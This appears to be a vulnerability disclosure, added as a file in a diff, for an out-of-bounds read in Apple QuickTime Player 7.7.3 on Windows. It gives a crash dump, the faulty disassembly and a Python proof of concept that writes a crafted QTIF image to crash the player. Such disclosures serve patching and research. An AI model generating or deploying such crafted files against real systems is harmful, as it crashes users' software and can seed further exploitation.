@@ -1,0 +1,95 @@
+# Title: Apple Quick Time Player (Windows)Version 7.7.3 Out of Bound Read
+# Date: 28th January,2013
+# Author: Debasish Mandal (https://twitter.com/debasishm89)
+# Blog : http://www.debasish.in/
+# Vendor Homepage: http://www.apple.com/
+# Software Link: http://www.apple.com/quicktime/download/
+# Version: Apple Quick Time version 7.7.3
+# Tested on: Windows XP SP2 / Windows 7
+'''
+[+] Summary:
+
+A memory out of bound read issue exists in Apple Quick Time Player v7.7.3 which can be triggered while 
+trying to open a specially crafted "qtif" image file using Quick Time Player/Quick time 
+Picture Viewer or Quick Time Browser Plug-in. If successful, a malicious third party could trigger an 
+invalid memory access, leading to a crash of the process.
+
+[+] Affected Module : QuickTime.qts
+
+[+] Crash Point:
+
+Faulting Instruction:
+QuickTime!LIST_ComponentDispatch+0x15ffd3:
+66a1a4e3 8b0c06          mov     ecx,dword ptr [esi+eax]
+ds:0023:42531f20=????????
+
+0:000> r
+eax=41414198 ebx=58580000 ecx=414141a0 edx=58585858 esi=0111dd88
+edi=41414198
+eip=66a1a4e3 esp=0012f324 ebp=42424242 iopl=0         nv up ei ng nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000            
+efl=00210293
+QuickTime!LIST_ComponentDispatch+0x15ffd3:
+66a1a4e3 8b0c06          mov     ecx,dword ptr [esi+eax]
+ds:0023:42531f20=????????
+
+[+] Buggy Code:(Code from C:\Program Files\QuickTime\QTSystem\QuickTime.qts)
+
+66A1A4E1   77 70            JA SHORT QuickTim.66A1A553
+66A1A4E3   8B0C06           MOV ECX,DWORD PTR DS:[ESI+EAX]
+66A1A4E6   0FB65406 03      MOVZX EDX,BYTE PTR DS:[ESI+EAX+3]
+66A1A4EB   894C24 14        MOV DWORD PTR SS:[ESP+14],ECX
+66A1A4EF   8A7424 16        MOV DH,BYTE PTR SS:[ESP+16]
+66A1A4F3   8BF9             MOV EDI,ECX
+66A1A4F5   C1E7 10          SHL EDI,10
+66A1A4F8   81E1 00FF0000    AND ECX,0FF00
+66A1A4FE   0BF9             OR EDI,ECX
+66A1A500   C1E7 08          SHL EDI,8
+66A1A503   0BD7             OR EDX,EDI
+66A1A505   8BCA             MOV ECX,EDX
+66A1A507   7E 4A            JLE SHORT QuickTim.66A1A553
+66A1A509   8D3C01           LEA EDI,DWORD PTR DS:[ECX+EAX]
+66A1A50C   3BEF             CMP EBP,EDI
+66A1A50E   72 43            JB SHORT QuickTim.66A1A553
+66A1A510   3BF8             CMP EDI,EAX
+66A1A512   72 3F            JB SHORT QuickTim.66A1A553
+66A1A514   8B4C06 04        MOV ECX,DWORD PTR DS:[ESI+EAX+4]
+66A1A518   0FB65406 07      MOVZX EDX,BYTE PTR DS:[ESI+EAX+7]
+66A1A51D   894C24 14        MOV DWORD PTR SS:[ESP+14],ECX
+66A1A521   8A7424 16        MOV DH,BYTE PTR SS:[ESP+16]
+66A1A525   8BD9             MOV EBX,ECX
+66A1A527   C1E3 10          SHL EBX,10
+66A1A52A   81E1 00FF0000    AND ECX,0FF00
+66A1A530   0BD9             OR EBX,ECX
+66A1A532   8B4C24 18        MOV ECX,DWORD PTR SS:[ESP+18]
+66A1A536   C1E3 08          SHL EBX,8
+66A1A539   0BD3             OR EDX,EBX
+66A1A53B   3BD1             CMP EDX,ECX
+66A1A53D   74 04            JE SHORT QuickTim.66A1A543
+66A1A53F   85C9             TEST ECX,ECX
+66A1A541   75 07            JNZ SHORT QuickTim.66A1A54A
+66A1A543   836C24 1C 01     SUB DWORD PTR SS:[ESP+1C],1
+66A1A548   74 0B            JE SHORT QuickTim.66A1A555
+66A1A54A   8BC7             MOV EAX,EDI
+66A1A54C   8D48 08          LEA ECX,DWORD PTR DS:[EAX+8]
+66A1A54F   3BCD             CMP ECX,EBP
+66A1A551  ^76 90            JBE SHORT QuickTim.66A1A4E3
+66A1A553   33C0             XOR EAX,EAX
+
+[+] Proof of Concept : 
+
+'''
+# /usr/bin/python
+buff = ""
+buff += "\x00\x00\x48\x79\x69\x64\x61\x74"
+buff += "\x5A"*18545			#Junks
+buff += "\x00\x00\x00\x6E\x69\x64\x73\x63"	#nidsc header
+buff += "\x42\x42\x42\x42"
+buff += "\x5A"*82				#Junk
+buff += "\x41"*3
+buff += "\x42"	
+buff += "\x58\x58\x58\x58"
+f = open('buggy.qtif','w')
+f.write(buff)
+f.close()
+
